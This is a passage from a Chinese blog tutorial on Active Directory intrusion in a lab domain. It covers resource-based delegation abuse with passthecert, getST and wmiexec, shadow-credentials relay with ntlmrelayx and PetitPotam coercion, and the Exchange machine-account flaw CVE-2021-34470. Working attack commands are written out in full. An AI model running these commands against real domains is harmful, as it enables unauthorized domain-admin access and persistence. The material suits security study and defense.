+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$</span></span></code></pre></div><p><img loading="lazy" src="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png" alt="x3TWi8.png" srcset="https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png?size=small, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png?size=medium 1.5x, https://shs3.b.qianxin.com/attack_forum/2022/10/attach-00e8c6a447520a80912521c26d918a280d735af5.png?size=large 2x" data-title="x3TWi8.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+</li>
+<li>
+<p>后渗透：申请TGT及攻击</p>
+<pre tabindex="0"><code>python3 getST.py -spn cifs/DC01.hack.lab -impersonate administrator hack.lab/NoPKI02\$:123.com -dc-ip 20.20.20.5
+KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.lab/administrator@DC01.hack.lab -no-pass -dc-ip 20.20.20.5</code></pre></li>
+</ol>
+<h6 id="修改-shadow-credentials-属性--影子账户" class="heading-element"><span>0.0.0.3.5  修改 Shadow Credentials 属性 | 影子账户</span>
+  <a href="#%e4%bf%ae%e6%94%b9-shadow-credentials-%e5%b1%9e%e6%80%a7--%e5%bd%b1%e5%ad%90%e8%b4%a6%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>&ndash;shadow-credentials</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>在支持 PKINIT 协议的域内环境，若目标机器账户存在 msDS-KeyCredentialLink 属性（公钥信息），在预认证中，可以使用对应的证书（私钥信息）进行验证身份。</p>
+<p>通过 NTLM Relay 攻击强制修改目标服务器的 msDS-KeyCredentialLink 属性，使用私钥信息申请 TGT，实现对目标对象持久和隐蔽的访问</p>
+<p>具体的原理在<a href="https://forum.butian.net/share/1607"target="_blank" rel="external nofollow noopener noreferrer">之前的文章</a>中有详细介绍过</p>
+<p>条件：</p>
+<ul>
+<li>目标服务器支持 PKINIT 协议</li>
+<li>域控制器版本在Windows Server 2016以上</li>
+<li>域内安装了AD CS服务</li>
+</ul>
+<p>####### 攻击流程</p>
+<p>1.开启监听器</p>
+<p>使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py"target="_blank" rel="external nofollow noopener noreferrer">ntlmrelayx.py</a>工具开启监听， &ndash;remove-mic 参数用于跨协议时LDAP签名的消除</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 ntlmrelayx.py -t ldap://DC01.hack.lab --remove-mic --shadow-credentials --shadow-target F2016$</span></span></code></pre></div><p>2.执行强制认证</p>
+<p>使用PetitPotam.py进行强制认证</p>
+<pre tabindex="0"><code>python3 PetitPotam.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6</code></pre><p>生成了对应的证书，由于需要结合AD CS使用，也分为两种情况：</p>
+<p>支持 PKINIT 协议和不支持 PKINIT 协议</p>
+<p>详情可以参考上一部分</p>
+<h6 id="利用-exchange-创建机器账户" class="heading-element"><span>0.0.0.3.6  利用 Exchange 创建机器账户</span>
+  <a href="#%e5%88%a9%e7%94%a8-exchange-%e5%88%9b%e5%bb%ba%e6%9c%ba%e5%99%a8%e8%b4%a6%e6%88%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><blockquote>
+<p>CVE-2021-34470
+绕过创建机器账户的限制</p>
+</blockquote>
+<p>####### 攻击原理</p>
+<p>在域中对普通用户限制创建机器账户的情况下，利用 Exchange 安装中一个有漏洞的LDAP模式对象，执行添加机器账户操作。</p>
+<p>背景：
+由于域内用户权限不正确及配置的不当，导致用户创建机器账户进行域内渗透攻击。
+因此，在常见的域内加固过程中，对域用户创建机器账户进行限制主要可以通过以下两种方法：</p>
+<ol>
+<li>修改域对象的LDAP属性ms-DS-MachineAccountQuota，默认为10，设置为0即可</li>
+<li>域特权SeMachineAccountPrivilege，管理哪些用户可以向域添加机器账户，默认设置为Authenticated Users，即全部用户。可以将其修改为小范围高权限用户，如Domain Admins</li>
+</ol>
+<p>该漏洞在2021年7月由James Forshaw公布，编号为CVE-2021-34470，一个计算机账户可以在自己下面创建一个msExchStorageGroup对象，然后在这个对象下可以创建许多类型的额外对象，包括机器账户。</p>
+<p>简而言之，利用 Exchange 中存在缺陷的对象创建机器账户</p>
+<p>相关攻击方式已经集成至 ntlmrelay 中的 &ndash;add-computer 参数中，详情见该<a href="https://github.com/SecureAuthCorp/impacket/pull/1288"target="_blank" rel="external nofollow noopener noreferrer">pull</a>
+工具使用可以查看 &ndash;add-computer 部分</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/55/" class="post-nav-item" rel="prev" title="域环境搭建"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>域环境搭建</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/63/" class="post-nav-item" rel="next" title="反弹shell">反弹shell<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
